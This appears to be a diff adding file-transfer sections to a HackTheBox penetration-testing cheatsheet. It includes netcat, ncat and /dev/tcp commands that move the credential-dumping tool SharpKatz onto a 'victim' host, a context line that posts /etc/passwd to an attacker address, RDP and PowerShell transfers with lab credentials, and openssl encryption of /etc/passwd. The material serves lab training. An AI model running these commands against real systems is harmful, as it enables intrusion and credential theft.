@@ -35,6 +35,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 	- [Windows File Transfer](#windows-file-transfer)
    	- [Linux File Transfer](#linux-file-transfer)
    	- [Transferring Files with Code](#transferring-files-with-code)
+   	- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
+   	- [Protected File Transfers](#protected-file-transfers)
 - [Shells](#shells)
     - [Reverse Shell](#reverse-shell)
     - [Bind Shell](#bind-shell)
@@ -694,6 +696,66 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 A> python3 -m uploadserver 
 A> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+### Miscellaneous File Transfer Methods
+#### File Transfer with Netcat and Ncat
+##### Forword file transfer
+```
+V> nc -l -p 8000 > SharpKatz.exe
+OR 
+V> ncat -l -p 8000 --recv-only > SharpKatz.exe
+A> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+OR
+A> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+##### Reverse file transfer
+```
+A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
+V> nc 192.168.49.128 443 > SharpKatz.exe
+OR
+A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
+V> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+
+--------------------------------------------------------
+
+A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
+OR A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
+V> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+##### PowerShell Session File Transfer
+```
+client> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+OR 
+client> $Session = New-PSSession -ComputerName DATABASE01
+client> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+##### RDP
+```
+A> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+OR A> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+V> \\tsclient\
+
+V> After selecting the drive, we can interact with it in the remote session that follows.
+<img width="1155" height="822" alt="image" src="https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb" />
+
+```
+### Protected File Transfers
+##### File Encryption on Windows
+```
+by using https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+.then > Import-Module .\Invoke-AESEncryption.ps1
+.then > Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+```
+##### File Encryption on Linux
+```
+# Encrypting
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+
+```
+
 ## Shells
 
 ##### Reverse Shell
